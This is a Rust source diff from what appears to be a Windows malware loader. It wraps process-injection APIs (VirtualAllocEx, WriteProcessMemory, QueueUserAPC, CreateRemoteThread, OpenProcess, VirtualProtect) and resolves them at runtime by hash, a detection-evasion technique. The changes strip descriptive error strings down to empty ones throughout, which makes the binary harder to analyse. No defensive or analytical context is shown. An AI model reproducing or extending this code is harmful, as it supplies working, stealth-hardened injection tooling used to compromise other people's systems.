@@ -47,7 +47,7 @@ fn init_apis() -> DynApis {
     unsafe {
         macro_rules! resolve {
             ($exp:expr) => {
-                mem::transmute(hash_resolve(H_KERNEL32, $exp).expect(stringify!($exp)))
+                mem::transmute(hash_resolve(H_KERNEL32, $exp).unwrap_or(std::ptr::null()))
             };
         }
         DynApis {
@@ -76,7 +76,7 @@ pub unsafe fn VirtualAllocEx(
     flallocationtype: u32,
     flprotect: u32,
 ) -> *mut std::ffi::c_void {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.VirtualAllocEx)(hprocess, lpaddress, dwsize, flallocationtype, flprotect)
 }
 
@@ -86,7 +86,7 @@ pub unsafe fn VirtualFreeEx(
     dwsize: usize,
     dwfreetype: u32,
 ) -> i32 {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.VirtualFreeEx)(hprocess, lpaddress, dwsize, dwfreetype)
 }
 
@@ -97,7 +97,7 @@ pub unsafe fn WriteProcessMemory(
     nsize: usize,
     lpnumberofbyteswritten: *mut usize,
 ) -> i32 {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.WriteProcessMemory)(hprocess, lpbaseaddress, lpbuffer, nsize, lpnumberofbyteswritten)
 }
 
@@ -106,14 +106,14 @@ pub unsafe fn QueueUserAPC(
     hthread: *mut std::ffi::c_void,
     dwparam: usize,
 ) -> u32 {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.QueueUserAPC)(pfnapc, hthread, dwparam)
 }
 
 pub unsafe fn ResumeThread(
     hthread: *mut std::ffi::c_void,
 ) -> u32 {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.ResumeThread)(hthread)
 }
 
@@ -129,7 +129,7 @@ pub unsafe fn CreateProcessW(
     lpstartupinfo: *mut std::ffi::c_void,
     lpprocessinformation: *mut std::ffi::c_void,
 ) -> i32 {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.CreateProcessW)(lpapplicationname, lpcommandline, lpprocessattributes, lpthreadattributes, binherithandles, dwcreationflags, lpenvironment, lpcurrentdirectory, lpstartupinfo, lpprocessinformation)
 }
 
@@ -137,7 +137,7 @@ pub unsafe fn WaitForSingleObject(
     hhandle: *mut std::ffi::c_void,
     dwmilliseconds: u32,
 ) -> u32 {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.WaitForSingleObject)(hhandle, dwmilliseconds)
 }
 
@@ -146,7 +146,7 @@ pub unsafe fn OpenProcess(
     binherithandle: i32,
     dwprocessid: u32,
 ) -> *mut std::ffi::c_void {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.OpenProcess)(dwdesiredaccess, binherithandle, dwprocessid)
 }
 
@@ -157,7 +157,7 @@ pub unsafe fn VirtualProtect(
     lpfloldprotect: *mut u32,
 ) -> i32 {
     let vp_fn: FnVirtualProtect = mem::transmute(
-        hash_resolve(H_KERNEL32, H_VirtualProtect).expect("VirtualProtect")
+        hash_resolve(H_KERNEL32, H_VirtualProtect).expect("")
     );
     (vp_fn)(lpaddress, dwsize, flnewprotect, lpfloldprotect)
 }
@@ -171,14 +171,14 @@ pub unsafe fn CreateRemoteThread(
     dwcreationflags: u32,
     lpthreadid: *mut u32,
 ) -> *mut std::ffi::c_void {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.CreateRemoteThread)(hprocess, lpthreadattributes, dwstacksize, lpstartaddress, lpparameter, dwcreationflags, lpthreadid)
 }
 
 pub unsafe fn CloseHandle(
     hobject: *mut std::ffi::c_void,
 ) -> i32 {
-    let apis = APIS.get().expect("dynapi");
+    let apis = APIS.get().expect("");
     (apis.CloseHandle)(hobject)
 }
 
